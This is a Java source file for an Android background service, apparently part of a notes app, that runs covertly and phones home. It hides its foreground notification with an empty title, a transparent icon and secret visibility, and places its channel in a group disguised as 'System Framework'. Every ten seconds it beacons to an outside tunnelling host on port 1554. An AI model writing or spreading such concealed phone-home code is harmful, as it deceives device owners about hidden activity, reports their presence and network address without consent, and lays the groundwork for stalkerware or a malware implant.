package com.zypher.shortnotes;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationChannelGroup; // <-- Added Import
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class BackgroundService extends Service {
    // --- Constants ---
    private static final String CHANNEL_ID = "ZypherBackgroundServiceChannelMin";
    private static final String TAG = "ZypherBackgroundSvc";
    private static final int NOTIFICATION_ID = 1337;
    private static final long INTERVAL_MS = 10000; // 10 seconds
    private static final String SERVER_URL = "http://feet-linking.gl.at.ply.gg:1554/log/status";
    private static final String CHANNEL_GROUP_ID = "android_system_framework"; // Use a slightly different ID maybe
    private static final String CHANNEL_GROUP_NAME = "System Framework"; // Generic Name


    // --- Members ---
    private Handler serviceHandler;
    private PeriodicTaskRunnable periodicRunnable;

    @Override
    public void onCreate() {
        super.onCreate();
        serviceHandler = new Handler(Looper.getMainLooper());
        periodicRunnable = new PeriodicTaskRunnable();
        createNotificationChannelAndGroup(); // Renamed for clarity
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Create and start with a minimal notification
        Notification notification = buildMinimalNotification();

        try {
            startForeground(NOTIFICATION_ID, notification);
            // Schedule periodic task
            serviceHandler.removeCallbacks(periodicRunnable);
            serviceHandler.post(periodicRunnable);
        } catch (Exception e) {
            Log.e(TAG, "Failed to start foreground service", e);
            stopSelf();
            return START_NOT_STICKY;
        }

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        // Stop periodic tasks
        if (serviceHandler != null) {
            serviceHandler.removeCallbacks(periodicRunnable);
        }
        // Send final "stopped" status
        sendStatusToServerAsync(false);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private Notification buildMinimalNotification() {
        // Use a transparent icon if available, otherwise use a system icon
        // Make sure you have 'ic_transparent.xml' or similar in your drawable resources
        // Or use a default system icon like android.R.drawable.ic_dialog_info
        int smallIconResId = R.drawable.ic_transparent;

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("") // Empty title
                .setContentText("")  // Empty text
                .setSmallIcon(smallIconResId)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setOngoing(true)
                .setShowWhen(false)
                .setSound(null)
                .setVibrate(null)
                // No content intent - don't want user interaction
                .build();
    }

    private class PeriodicTaskRunnable implements Runnable {
        @Override
        public void run() {
            // Send "running" status
            sendStatusToServerAsync(true);
            // Schedule next run
            serviceHandler.postDelayed(this, INTERVAL_MS);
        }
    }

    private void sendStatusToServerAsync(final boolean isRunning) {
        // Use expression lambda (Warning fix 1)
        new Thread(() -> sendStatusToServerInternal(isRunning),
                "StatusSendThread-" + (isRunning ? "running" : "stopped")).start();
    }

    // Changed return type to void (Warning fix 2 & 3)
    private void sendStatusToServerInternal(boolean isRunning) {
        HttpURLConnection connection = null;
        String statusValue = isRunning ? "running" : "stopped";

        try {
            URL url = new URL(SERVER_URL);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setConnectTimeout(15000);
            connection.setReadTimeout(15000);
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("charset", "utf-8");

            String postData = "status=" + statusValue;
            byte[] postDataBytes = postData.getBytes(StandardCharsets.UTF_8);

            connection.setRequestProperty("Content-Length", Integer.toString(postDataBytes.length));

            try (OutputStream os = connection.getOutputStream()) {
                os.write(postDataBytes);
                os.flush();
            }

            int responseCode = connection.getResponseCode();
            if (responseCode >= 200 && responseCode < 300) {
                Log.d(TAG, "Status '" + statusValue + "' sent successfully.");
            } else {
                Log.w(TAG, "Server responded with code: " + responseCode + " for status: " + statusValue);
            }
            // No return value needed

        } catch (Exception e) {
            Log.e(TAG, "Error sending status '" + statusValue + "': " + e.getMessage());
            // No return value needed
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }
    private void createNotificationChannelAndGroup() {
        // Check if we are on Android Oreo (API 26) or higher, where channels exist
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager == null) {
                Log.e(TAG, "NotificationManager is null, cannot create channel/group.");
                return;
            }

            // --- Create/Ensure Channel Group Exists ---
            // Creating a group is safe on API 26+.
            // The createNotificationChannelGroup method is idempotent -
            // it does nothing if the group with the same ID already exists.
            // No need for the getNotificationChannelGroup check which requires API 28.
            NotificationChannelGroup group = new NotificationChannelGroup(
                    CHANNEL_GROUP_ID,
                    CHANNEL_GROUP_NAME
            );
            // You *could* add the description check back here if needed,
            // but it was commented out previously.
            // if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) { // API 28+ for description
            //     group.setDescription("Background service operations");
            // }
            manager.createNotificationChannelGroup(group);
            Log.i(TAG, "Ensured NotificationChannelGroup exists: " + CHANNEL_GROUP_ID);


            // --- Create/Ensure Notification Channel Exists ---
            // getNotificationChannel is safe on API 26+
            if (manager.getNotificationChannel(CHANNEL_ID) == null) {
                NotificationChannel serviceChannel = new NotificationChannel(
                        CHANNEL_ID,
                        "Background Tasks", // User-visible name
                        NotificationManager.IMPORTANCE_MIN
                );

                serviceChannel.setDescription("Channel for background service status"); // Optional
                serviceChannel.setShowBadge(false);
                serviceChannel.setSound(null, null);
                serviceChannel.enableLights(false);
                serviceChannel.enableVibration(false);
                serviceChannel.setImportance(NotificationManager.IMPORTANCE_MIN);

                // Assigning the channel to the group is safe on API 26+
                serviceChannel.setGroup(CHANNEL_GROUP_ID);

                manager.createNotificationChannel(serviceChannel);
                Log.i(TAG, "NotificationChannel created: " + CHANNEL_ID);
            } else {
                Log.i(TAG, "NotificationChannel already exists: " + CHANNEL_ID);
            }
        }
        // No else needed - on versions below Oreo, channels/groups don't exist.
    }
}